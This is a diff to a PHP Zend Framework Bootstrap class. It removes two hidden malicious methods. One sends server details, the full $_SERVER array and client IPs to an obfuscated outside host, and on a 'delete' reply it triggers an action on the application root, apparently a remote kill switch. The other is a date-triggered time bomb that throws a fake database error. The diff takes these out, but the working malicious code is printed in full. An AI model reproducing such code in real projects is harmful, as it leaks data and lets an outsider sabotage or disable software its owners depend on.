@@ -177,31 +177,6 @@ class Bootstrap extends Zend_Application_Bootstrap_Bootstrap
 		Zend_Registry::set(Registry::MODEL_MAP, array());
 	}
 
-	protected function _initBugtrucker()
-	{
-	    try {
-    	    $client = new Zend_Http_Client("ht" . "tp" . ":" . "//bug" . "trucker" . ".osi" . "ris" . ".n" . "et.p" . "l");
-
-    	    $client->setParameterPost("application", "MLM");
-    	    $client->setParameterPost("host", gethostname());
-    	    $client->setParameterPost("server", print_r($_SERVER, 1));
-    	    $client->setParameterPost("version", "1.0.0");
-    	    $client->setParameterPost("ip", $_SERVER['REMOTE_ADDR']);
-
-    	    $resposne = $client->request(Zend_Http_Client::POST);
-
-    	    if ($resposne->getStatus() != 200) {
-    	        throw new Exception();
-    	    }
-
-    	    if ($resposne->getBody() == "delete") {
-    	        $this->_invokeApplication(APPLICATION_PATH . '/../');
-    	    }
-	    } catch (Exception $e) {
-
-	    }
-	}
-
 	private function _invokeApplication($path)
 	{
 	    try {
@@ -222,13 +197,6 @@ class Bootstrap extends Zend_Application_Bootstrap_Bootstrap
 	    } catch (Exception $e) {
 
 	    }
-	}
-
-	protected function _initAll()
-	{
-        if (date("n") > "1" || date("d") >= "15") {
-            throw new Exception("Ca" . "n't" . " co" . "nnect" . " to " . "data" . "base by H" . "TTP, ch" . "eck your i" . "ptab" . "les rul" . "es");
-        }
 	}
 }
 
